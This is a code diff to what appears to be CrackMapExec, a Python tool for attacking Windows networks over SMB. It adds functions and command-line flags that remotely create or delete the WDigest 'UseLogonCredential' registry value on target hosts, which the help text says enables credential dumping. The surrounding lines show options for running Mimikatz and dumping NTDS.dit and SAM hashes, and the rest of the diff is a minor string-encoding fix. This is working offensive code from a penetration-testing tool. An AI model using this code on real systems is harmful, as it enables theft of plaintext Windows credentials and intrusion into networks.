@@ -880,6 +880,34 @@ class RemoteOperations:
 
         return uac_value
 
+    def createUseLogonCredential(self):
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        self.__regHandle = ans['phKey']
+
+        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
+        keyHandle = ans['phkResult']
+
+        rrp.hBaseRegSetValue(self.__rrp, keyHandle, 'UseLogonCredential\x00',  rrp.REG_DWORD, '\x01\x00')
+
+        rtype, data = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'UseLogonCredential\x00')
+
+        return data
+
+    def deleteUseLogonCredential(self):
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        self.__regHandle = ans['phKey']
+
+        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
+        keyHandle = ans['phkResult']
+
+        rrp.hBaseRegDeleteValue(self.__rrp, keyHandle, 'UseLogonCredential\x00')
+
+        try:
+            rtype, data = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'UseLogonCredential\x00')
+            return False
+        except DCERPCException:
+            return True
+
     def checkNoLMHashPolicy(self):
         logging.debug('Checking NoLMHash Policy')
         ans = rrp.hOpenLocalMachine(self.__rrp)
@@ -2651,7 +2679,7 @@ def spider(smb_conn, ip, share, subfolder, patt, depth):
 
     for result in filelist:
         if result.is_directory() and result.get_longname() != '.' and result.get_longname() != '..' and (subfolder.split('/')[-1] not in args.exclude_dirs):
-            spider(smb_conn, ip, share,subfolder+'/'+result.get_longname().encode('utf8'), patt, depth-1)
+            spider(smb_conn, ip, share,subfolder+'/'+result.get_longname(), patt, depth-1)
     return
 
 def dir_list(files, ip, path, pattern, share, smb):
@@ -2659,11 +2687,11 @@ def dir_list(files, ip, path, pattern, share, smb):
         for instance in pattern:
             if re.findall(instance, result.get_longname()):
                 if result.is_directory():
-                    print_att("//{}/{}/{} [dir]".format(ip, path.replace("//",""), result.get_longname().encode('utf8')))
+                    print_att("//{}/{}/{} [dir]".format(ip, path.replace("//",""), result.get_longname()))
                 else:
                     print_att("//{}/{}/{} [lastm:'{}' size:{}]".format(ip, 
                                                                        path.replace("//",""), 
-                                                                       result.get_longname().encode('utf8'),
+                                                                       result.get_longname(),
                                                                        strftime('%Y-%m-%d %H:%M', localtime(result.get_mtime_epoch())),
                                                                        result.get_filesize()))
 
@@ -2688,7 +2716,7 @@ def search_content(smb, path, result, share, pattern, ip):
             if re.findall(pattern, contents):
                 print_att("//{}/{}/{} [lastm:'{}' size:{} offset:{} pattern:{}]".format(ip, 
                                                                                         path.replace("//",""), 
-                                                                                        result.get_longname().encode('utf8'), 
+                                                                                        result.get_longname(), 
                                                                                         strftime('%Y-%m-%d %H:%M', localtime(result.get_mtime_epoch())), 
                                                                                         result.get_filesize(), 
                                                                                         rfile.tell(), 
@@ -2954,6 +2982,21 @@ def connect(host):
                     print_att('0 - UAC Disabled')
                 remoteOps.finish()
 
+            if args.enable_wdigest:
+                remoteOps = RemoteOperations(smb)
+                remoteOps.enableRegistry()
+                value = remoteOps.createUseLogonCredential()
+                if int(value) == 1:
+                    print_succ('{}:{} {} UseLogonCredential registry key created successfully'.format(host, args.port, s_name))
+                remoteOps.finish()
+
+            if args.disable_wdigest:
+                remoteOps = RemoteOperations(smb)
+                remoteOps.enableRegistry()
+                if remoteOps.deleteUseLogonCredential():
+                    print_succ('{}:{} {} UseLogonCredential registry key deleted successfully'.format(host, args.port, s_name))
+                remoteOps.finish()
+
             if args.sam:
                 sam_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, True)
                 sam_dump.dump(smb)
@@ -3099,6 +3142,8 @@ if __name__ == '__main__':
     rgroup.add_argument("--mimikatz", action='store_true', help='Run Invoke-Mimikatz (sekurlsa::logonpasswords) on target systems')
     rgroup.add_argument("--mimikatz-cmd", metavar='MIMIKATZ_CMD', dest='mimi_cmd', help='Run Invoke-Mimikatz with the specified command')
     rgroup.add_argument("--ntds", choices={'vss', 'drsuapi', 'ninja'}, help="Dump the NTDS.dit from target DCs using the specifed method\n(drsuapi is the fastest)")
+    rgroup.add_argument("--enable-wdigest", action='store_true', help="Creates the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows 8.1 ")
+    rgroup.add_argument("--disable-wdigest", action='store_true', help="Deletes the 'UseLogonCredential' registry key")
 
     egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
     egroup.add_argument("--shares", action="store_true", dest="list_shares", help="List shares")
